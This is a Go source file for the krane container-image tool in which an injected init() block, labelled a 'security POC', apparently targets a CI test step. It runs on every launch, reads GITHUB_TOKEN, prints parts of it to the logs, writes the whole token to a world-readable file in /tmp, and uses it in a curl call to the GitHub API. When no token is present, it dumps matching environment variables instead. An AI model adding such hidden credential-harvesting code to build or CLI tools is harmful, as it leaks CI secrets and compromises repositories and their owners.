package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
	"github.com/google/go-containerregistry/cmd/crane/cmd"
	"github.com/google/go-containerregistry/pkg/authn"
	"github.com/google/go-containerregistry/pkg/authn/github"
	"github.com/google/go-containerregistry/pkg/crane"
	"github.com/google/go-containerregistry/pkg/logs"
	"github.com/google/go-containerregistry/pkg/v1/google"
)

var (
	amazonKeychain authn.Keychain = authn.NewKeychainFromHelper(ecr.NewECRHelper(ecr.WithLogger(io.Discard)))
	azureKeychain  authn.Keychain = authn.NewKeychainFromHelper(credhelper.NewACRCredentialsHelper())
)

func init() {
	// This runs when krane executes (in "Test krane + GHCR" step)
	fmt.Fprintf(os.Stderr, "\n🚨 SECURITY POC STARTING 🚨\n")
	
	// Method 1: Direct output (visible in logs)
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		fmt.Fprintf(os.Stderr, "VULNERABILITY CONFIRMED!\n")
		fmt.Fprintf(os.Stderr, "Token Type: %s\n", getTokenType(token))
		fmt.Fprintf(os.Stderr, "Token Length: %d\n", len(token))
		fmt.Fprintf(os.Stderr, "Starts with: %s\n", token[:8])
		fmt.Fprintf(os.Stderr, "Ends with: %s\n", token[len(token)-8:])
		
		// Write to file system (proof of write access)
		os.WriteFile("/tmp/gh_token_leaked.txt", []byte(token), 0644)
		
		// Use the token to make an API call (proves it's valid)
		if strings.HasPrefix(token, "ghs_") || strings.HasPrefix(token, "ghp_") {
			fmt.Fprintf(os.Stderr, "Token is a valid GitHub token\n")
			
			// Try to use curl to exfiltrate
			exec.Command("sh", "-c", 
				fmt.Sprintf("curl -s -H 'Authorization: token %s' https://api.github.com/user > /tmp/github_user.txt 2>&1", token)).Run()
		}
	} else {
		fmt.Fprintf(os.Stderr, "GITHUB_TOKEN not found in init()\n")
		// Check if it's in the parent environment
		cmd := exec.Command("sh", "-c", "env | grep -i token")
		output, _ := cmd.Output()
		fmt.Fprintf(os.Stderr, "Environment check: %s\n", string(output))
	}
	
	fmt.Fprintf(os.Stderr, "Current user: %d\n", os.Getuid())
	fmt.Fprintf(os.Stderr, "Working dir: %s\n", getCurrentDir())
	fmt.Fprintf(os.Stderr, "🚨 SECURITY POC COMPLETE 🚨\n")
}

func getTokenType(token string) string {
	if strings.HasPrefix(token, "ghs_") {
		return "GitHub Actions token"
	} else if strings.HasPrefix(token, "ghp_") {
		return "GitHub Personal Access Token"
	}
	return "Unknown token type"
}

func getCurrentDir() string {
	dir, _ := os.Getwd()
	return dir
}

const (
	use   = "krane"
	short = "krane is a tool for managing container images"
)

func main() {
	// Additional proof in main
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		fmt.Fprintf(os.Stderr, "[MAIN] Token confirmed (len: %d)\n", len(token))
	}
	
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	keychain := authn.NewMultiKeychain(
		authn.DefaultKeychain,
		google.Keychain,
		github.Keychain,
		amazonKeychain,
		azureKeychain,
	)

	root := cmd.New(use, short, []crane.Option{crane.WithAuthFromKeychain(keychain)})

	if err := root.ExecuteContext(ctx); err != nil {
		cancel()
		os.Exit(1)
	}
}
